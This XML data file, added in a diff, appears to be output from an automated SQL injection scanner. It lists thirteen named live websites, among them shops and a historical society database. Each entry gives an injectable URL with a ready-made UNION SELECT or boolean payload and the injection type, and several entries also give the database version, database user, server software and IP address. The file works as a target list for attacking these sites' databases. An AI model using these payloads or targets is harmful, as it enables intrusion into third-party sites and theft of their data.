@@ -1,0 +1,224 @@
+<?xml version="1.0" standalone="yes"?>
+<DocumentElement>
+  <Item>
+    <C01>https://www.fleurlis.com.tw/en/scene.php?cid=999999.9 union all select 1,[t],3,4,5&amp;id=2</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.1.48-log</C04>
+    <C05>vhost53647@localhost</C05>
+    <C06>20,065:TW [P:1,309,930 R:1,217,883 D:60,507] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[TW] Taiwan, Province of China</C08>
+    <C09>211.72.206.5</C09>
+    <C10>01/28 17:49</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.clemcoindustries.com/products_showitem_clemco.php?item_id=999999.9 union all select 1,2,3,4,[t],6,7,8,9</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.5.33-log</C04>
+    <C05>clemco_db@208.109.181.92</C05>
+    <C06>412,046:US [P:1,236,336 R:1,475,404 D:-194,082] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[US] United States</C08>
+    <C09>208.109.181.92</C09>
+    <C10>01/28 17:49</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.global-money.com/item.php?id=170 ' and [t] and '1'='1&amp; www.Global-Money.com/item.cart.php?id=170</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04 />
+    <C05 />
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[CA] Canada</C08>
+    <C09>216.138.234.150</C09>
+    <C10>01/28 17:39</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.masshist.org/database/viewer.php?item_id=[t]</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04 />
+    <C05 />
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache/2.2.15 (CentOS)</C07>
+    <C08>[--] N/A</C08>
+    <C09>104.239.203.111</C09>
+    <C10>01/28 17:38</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.barryowen.com/toys.php?catID=[t]&amp;subCatID=49</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04 />
+    <C05 />
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[--] N/A</C08>
+    <C09>45.40.182.1</C09>
+    <C10>01/28 17:37</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.sassybling.com/sub.php?db_cid=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.38</C04>
+    <C05>sassyb10_live@localhost</C05>
+    <C06>N/A [P:12,748,161 R:18,113,999 D:4,854,985] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[US] United States</C08>
+    <C09>173.247.252.106</C09>
+    <C10>01/28 17:36</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.cnps.org/cnps/horticulture/calendar/event_single.php?item_id=[t]</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04 />
+    <C05 />
+    <C06>79,059:US [P:442,818 R:453,697 D:-136,826] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[US] United States</C08>
+    <C09>184.168.207.85</C09>
+    <C10>01/28 17:35</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://colorytradicion.com/categorias.php?catid=999999.9 union all select [t],2,3</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.0.96-log</C04>
+    <C05>colorytr@184.168.46.192</C05>
+    <C06>N/A [P:12,830,319 R:12,008,734 D:3,970,261] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[US] United States</C08>
+    <C09>50.63.48.1</C09>
+    <C10>01/28 17:35</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.poelang.com/products/detail.php?pid=1&amp;fmenu=2&amp;cid=999999.9 union all select 1,[t],3&amp;language=_eng</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.5.58-cll</C04>
+    <C05>poelang_admin@localhost</C05>
+    <C06>780,876:RU [P:5,264,506 R:5,878,948 D:623,475] (N/A)</C06>
+    <C07>Apache/2.2.24 (Unix) mod_ssl/2.2.24 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 PHP/5.2.17 mod_perl/2.0.6 Perl/v5.10.1</C07>
+    <C08>[US] United States</C08>
+    <C09>198.55.121.5</C09>
+    <C10>01/28 17:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.davidshop.com/showcat.php?id=999999.9 union all select [t]</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>4.0.24_Debian-10sarge3-log</C04>
+    <C05>davidshop@localhost</C05>
+    <C06>197,482:ID [P:2,222,484 R:2,401,353 D:178,798] (N/A)</C06>
+    <C07>Apache/2.0.54 (Debian GNU/Linux) PHP/4.3.10-22 mod_ssl/2.0.54 OpenSSL/0.9.7e mod_watch/4.3 mod_jk/1.2.14</C07>
+    <C08>[IT] Italy</C08>
+    <C09>85.94.208.166</C09>
+    <C10>01/28 17:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.casacrystal.com/category.php?cid=999999.9 union all select 1,2,[t],4,5,6,7,8,9--</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.7.11-log</C04>
+    <C05>web@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Microsoft-IIS/8.5</C07>
+    <C08>[US] United States</C08>
+    <C09>65.36.222.236</C09>
+    <C10>01/28 17:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.titanchair.ca/detail.php?pid=999999.9' union all select [t],2,3 and '0'='0&amp;db_pid=0&amp;db_ctname=&amp;db_ccname=&amp;db_csname=&amp;page=1</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.38</C04>
+    <C05>titanc7_live@localhost</C05>
+    <C06>66,984:CA [P:3,057,171 R:3,277,761 D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[CA] Canada</C08>
+    <C09>66.117.7.126</C09>
+    <C10>01/28 17:52</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://ayurnex.com/add-to-cart.php?id=38' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04 />
+    <C05 />
+    <C06>N/A [P:13,018,902 R:17,072,967 D:-474,457] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[US] United States</C08>
+    <C09>198.136.58.154</C09>
+    <C10>01/28 17:54</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+</DocumentElement>
